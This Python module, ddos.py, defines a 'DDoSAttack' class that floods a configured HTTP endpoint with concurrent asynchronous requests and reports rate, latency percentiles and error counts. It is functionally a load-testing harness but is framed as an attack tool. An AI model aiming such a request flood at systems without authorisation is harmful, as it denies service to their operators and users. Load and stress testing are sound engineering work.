# ddos.py

import asyncio
import time
import uuid

from dataclasses import dataclass, field
from typing import Any, AsyncGenerator

import httpx


# ============================================================
# Types
# ============================================================

@dataclass
class AttackState:
    attack_id: str
    status: str = "pending"

    started_at: float | None = None
    finished_at: float | None = None

    planned_requests: int = 0
    attempted_requests: int = 0

    successful_requests: int = 0
    failed_requests: int = 0
    timeout_requests: int = 0
    retried_requests: int = 0

    active_requests: int = 0

    status_codes: dict[int, int] = field(default_factory=dict)
    errors: dict[str, int] = field(default_factory=dict)

    latencies: list[float] = field(default_factory=list)

    error_message: str | None = None


# ============================================================
# DDoS Attack
# ============================================================

class DDoSAttack:

    def __init__(self, config: dict[str, Any]):

        self.config = config

        self.target = config["target"]
        self.request_config = config["request"]
        self.attack_config = config["attack"]

        self.attack_id = str(uuid.uuid4())

        # ----------------------------------------------------
        # Target
        # ----------------------------------------------------

        self.base_url = self.target["base_url"].rstrip("/")
        self.endpoint = self.target["endpoint"]

        self.method = self.target["method"].upper()

        self.path_params = self.target.get("path_params")
        self.query_params = self.target.get("query_params")

        # ----------------------------------------------------
        # Request
        # ----------------------------------------------------

        self.headers = self.request_config.get("headers")
        self.auth = self.request_config.get("auth")
        self.body = self.request_config.get("body")

        # ----------------------------------------------------
        # Attack
        # ----------------------------------------------------

        self.duration = self.attack_config.get("duration")
        self.max_requests = self.attack_config.get("requests")

        self.concurrency = self.attack_config.get(
            "concurrency",
            10,
        )

        self.delay = self.attack_config.get(
            "delay",
            0,
        )

        self.timeout = self.attack_config.get(
            "timeout",
            10,
        )

        self.retries = self.attack_config.get(
            "retries",
            0,
        )

        self.on_failure = self.attack_config.get(
            "on_failure",
            "continue",
        )

        # ----------------------------------------------------
        # Runtime
        # ----------------------------------------------------

        self.state = AttackState(
            attack_id=self.attack_id,
            planned_requests=self.max_requests or 0,
        )

        self.stop_event = asyncio.Event()

        self.request_lock = asyncio.Lock()
        self.state_lock = asyncio.Lock()

        self._task: asyncio.Task | None = None

    # ========================================================
    # URL
    # ========================================================

    def build_url(self) -> str:

        endpoint = self.endpoint

        if self.path_params:

            for key, value in self.path_params.items():

                endpoint = endpoint.replace(
                    f"{{{key}}}",
                    str(value),
                )

        return f"{self.base_url}{endpoint}"

    # ========================================================
    # Query Parameters
    # ========================================================

    def build_query_params(self) -> dict[str, Any] | None:

        if not self.query_params:
            return None

        return self.query_params

    # ========================================================
    # Authentication
    # ========================================================

    def build_auth(self):

        if not self.auth:
            return None

        if isinstance(self.auth, dict):

            auth_type = self.auth.get("type")

            if auth_type == "basic":

                return httpx.BasicAuth(
                    self.auth.get("username", ""),
                    self.auth.get("password", ""),
                )

        return self.auth

    # ========================================================
    # Request
    # ========================================================

    def build_request(self) -> dict[str, Any]:

        request = {
            "method": self.method,
            "url": self.build_url(),
        }

        if self.headers:
            request["headers"] = self.headers

        query_params = self.build_query_params()

        if query_params:
            request["params"] = query_params

        auth = self.build_auth()

        if auth:
            request["auth"] = auth

        if self.body is not None:
            request["json"] = self.body

        return request

    # ========================================================
    # Request Slot
    # ========================================================

    async def acquire_request_slot(self) -> bool:

        async with self.request_lock:

            if self.stop_event.is_set():
                return False

            if (
                self.max_requests is not None
                and self.state.attempted_requests
                >= self.max_requests
            ):
                self.stop_event.set()
                return False

            self.state.attempted_requests += 1

            return True

    # ========================================================
    # State Helpers
    # ========================================================

    async def increment_active(self):

        async with self.state_lock:
            self.state.active_requests += 1

    async def decrement_active(self):

        async with self.state_lock:

            self.state.active_requests = max(
                0,
                self.state.active_requests - 1,
            )

    async def record_success(
        self,
        status_code: int,
        latency: float,
    ):

        async with self.state_lock:

            self.state.successful_requests += 1

            self.state.latencies.append(
                latency
            )

            self.state.status_codes[status_code] = (
                self.state.status_codes.get(
                    status_code,
                    0,
                )
                + 1
            )

    async def record_failure(
        self,
        status_code: int | None = None,
        error: str | None = None,
        latency: float | None = None,
    ):

        async with self.state_lock:

            self.state.failed_requests += 1

            if latency is not None:
                self.state.latencies.append(
                    latency
                )

            if status_code is not None:

                self.state.status_codes[
                    status_code
                ] = (
                    self.state.status_codes.get(
                        status_code,
                        0,
                    )
                    + 1
                )

            if error:

                self.state.errors[error] = (
                    self.state.errors.get(
                        error,
                        0,
                    )
                    + 1
                )

    # ========================================================
    # Retry Delay
    # ========================================================

    async def retry_delay(self):

        if self.delay > 0:
            await asyncio.sleep(
                self.delay
            )

    # ========================================================
    # Send Request
    # ========================================================

    async def send_request(
        self,
        client: httpx.AsyncClient,
    ):

        if not await self.acquire_request_slot():
            return

        await self.increment_active()

        try:

            attempt = 0

            while True:

                if self.stop_event.is_set():
                    return

                attempt += 1

                started = time.perf_counter()

                try:

                    response = await client.request(
                        **self.build_request()
                    )

                    latency = (
                        time.perf_counter()
                        - started
                    )

                    if 200 <= response.status_code < 400:

                        await self.record_success(
                            response.status_code,
                            latency,
                        )

                        return

                    # ----------------------------------------
                    # HTTP failure
                    # ----------------------------------------

                    if attempt <= self.retries:

                        async with self.state_lock:
                            self.state.retried_requests += 1

                        await self.retry_delay()

                        continue

                    await self.record_failure(
                        status_code=response.status_code,
                        latency=latency,
                    )

                    if self.on_failure == "stop":
                        self.stop_event.set()

                    return

                except httpx.TimeoutException as exc:

                    latency = (
                        time.perf_counter()
                        - started
                    )

                    if attempt <= self.retries:

                        async with self.state_lock:
                            self.state.retried_requests += 1

                        await self.retry_delay()

                        continue

                    async with self.state_lock:

                        self.state.timeout_requests += 1

                    await self.record_failure(
                        error=type(exc).__name__,
                        latency=latency,
                    )

                    if self.on_failure == "stop":
                        self.stop_event.set()

                    return

                except httpx.HTTPError as exc:

                    latency = (
                        time.perf_counter()
                        - started
                    )

                    if attempt <= self.retries:

                        async with self.state_lock:
                            self.state.retried_requests += 1

                        await self.retry_delay()

                        continue

                    await self.record_failure(
                        error=type(exc).__name__,
                        latency=latency,
                    )

                    if self.on_failure == "stop":
                        self.stop_event.set()

                    return

                except Exception as exc:

                    if attempt <= self.retries:

                        async with self.state_lock:
                            self.state.retried_requests += 1

                        await self.retry_delay()

                        continue

                    await self.record_failure(
                        error=type(exc).__name__,
                    )

                    if self.on_failure == "stop":
                        self.stop_event.set()

                    return

        finally:

            await self.decrement_active()

    # ========================================================
    # Worker
    # ========================================================

    async def worker(
        self,
        client: httpx.AsyncClient,
        semaphore: asyncio.Semaphore,
    ):

        while not self.stop_event.is_set():

            async with semaphore:

                if self.stop_event.is_set():
                    return

                await self.send_request(
                    client
                )

            if self.delay > 0:

                await asyncio.sleep(
                    self.delay
                )

    # ========================================================
    # Duration Controller
    # ========================================================

    async def duration_controller(self):

        if self.duration is None:
            return

        await asyncio.sleep(
            self.duration
        )

        self.stop_event.set()

    # ========================================================
    # Main Attack
    # ========================================================

    async def run(self) -> dict[str, Any]:

        if self.state.status == "running":
            return self.get_status()

        self.state.status = "running"
        self.state.started_at = time.time()

        limits = httpx.Limits(
            max_connections=self.concurrency,
            max_keepalive_connections=self.concurrency,
        )

        timeout = httpx.Timeout(
            self.timeout
        )

        semaphore = asyncio.Semaphore(
            self.concurrency
        )

        workers = []
        duration_task = None

        try:

            async with httpx.AsyncClient(
                limits=limits,
                timeout=timeout,
                follow_redirects=False,
            ) as client:

                # ---------------------------------------------
                # Start workers
                # ---------------------------------------------

                workers = [
                    asyncio.create_task(
                        self.worker(
                            client,
                            semaphore,
                        )
                    )
                    for _ in range(self.concurrency)
                ]

                # ---------------------------------------------
                # Start duration controller
                # ---------------------------------------------

                if self.duration is not None:

                    duration_task = asyncio.create_task(
                        self.duration_controller()
                    )

                # ---------------------------------------------
                # Wait until the attack should stop
                # ---------------------------------------------

                while not self.stop_event.is_set():

                    # All workers finished naturally.
                    # This normally means request limit reached.
                    if all(
                        worker.done()
                        for worker in workers
                    ):
                        self.stop_event.set()
                        break

                    # Small async wait so we don't block
                    # the event loop.
                    await asyncio.sleep(0.01)

                # ---------------------------------------------
                # Tell workers to stop
                # ---------------------------------------------

                self.stop_event.set()

                # ---------------------------------------------
                # Cancel remaining workers
                # ---------------------------------------------

                for worker in workers:

                    if not worker.done():
                        worker.cancel()

                # ---------------------------------------------
                # Cancel duration controller
                # ---------------------------------------------

                if (
                    duration_task is not None
                    and not duration_task.done()
                ):
                    duration_task.cancel()

                # ---------------------------------------------
                # Collect workers
                # ---------------------------------------------

                await asyncio.gather(
                    *workers,
                    return_exceptions=True,
                )

                # ---------------------------------------------
                # Collect duration task
                # ---------------------------------------------

                if duration_task is not None:

                    await asyncio.gather(
                        duration_task,
                        return_exceptions=True,
                    )

        except asyncio.CancelledError:

            self.stop_event.set()

            self.state.status = "stopped"

            # Make sure workers are stopped
            for worker in workers:

                if not worker.done():
                    worker.cancel()

            await asyncio.gather(
                *workers,
                return_exceptions=True,
            )

            raise

        except Exception as exc:

            self.stop_event.set()

            self.state.status = "failed"

            self.state.error_message = str(exc)

        finally:

            if self.state.status == "running":
                self.state.status = "completed"

            self.state.finished_at = time.time()

        return self.get_status()

    # ========================================================
    # Start in Background
    # ========================================================

    async def start(self) -> str:

        if (
            self._task
            and not self._task.done()
        ):
            return self.attack_id

        self._task = asyncio.create_task(
            self.run()
        )

        return self.attack_id

    # ========================================================
    # Stop
    # ========================================================

    def stop(self):

        self.stop_event.set()

    # ========================================================
    # Status
    # ========================================================

    def get_status(self) -> dict[str, Any]:

        now = time.time()

        if self.state.started_at:

            elapsed = (
                (
                    self.state.finished_at
                    or now
                )
                - self.state.started_at
            )

        else:
            elapsed = 0

        if self.state.latencies:

            sorted_latencies = sorted(
                self.state.latencies
            )

            def percentile(p: float):

                index = int(
                    len(sorted_latencies)
                    * p
                )

                index = min(
                    index,
                    len(sorted_latencies) - 1,
                )

                return (
                    sorted_latencies[index]
                    * 1000
                )

            average_latency = (
                sum(
                    self.state.latencies
                )
                / len(
                    self.state.latencies
                )
                * 1000
            )

            p50 = percentile(0.50)
            p95 = percentile(0.95)
            p99 = percentile(0.99)

        else:

            average_latency = 0
            p50 = 0
            p95 = 0
            p99 = 0

        rps = (
            self.state.attempted_requests
            / elapsed
            if elapsed > 0
            else 0
        )

        return {
            "attack_id": self.state.attack_id,

            "status": self.state.status,

            "elapsed_seconds": elapsed,

            "progress": {
                "planned_requests": self.state.planned_requests,
                "attempted_requests": self.state.attempted_requests,
                "active_requests": self.state.active_requests,
            },

            "requests": {
                "successful": self.state.successful_requests,
                "failed": self.state.failed_requests,
                "timeouts": self.state.timeout_requests,
                "retried": self.state.retried_requests,
            },

            "performance": {
                "requests_per_second": rps,
                "average_latency_ms": average_latency,
                "p50_latency_ms": p50,
                "p95_latency_ms": p95,
                "p99_latency_ms": p99,
            },

            "status_codes": dict(
                self.state.status_codes
            ),

            "errors": dict(
                self.state.errors
            ),

            "error_message": self.state.error_message,
        }

    # ========================================================
    # SSE / Live Stream
    # ========================================================
    async def stream(
        self,
        interval: float = 1.0,
    ) -> AsyncGenerator[
        dict[str, Any],
        None,
    ]:

        while True:

            status = self.get_status()
            yield status

            if status["status"] in {
                "completed",
                "failed",
                "stopped",
            }:

                # Make sure run() has fully settled
                if self._task:
                    try:
                        await self._task

                    except asyncio.CancelledError:
                        pass

                break
            await asyncio.sleep(interval)

    # ========================================================
    # Wait
    # ========================================================

    async def wait(self):

        if self._task:
            await self._task
        return self.get_status()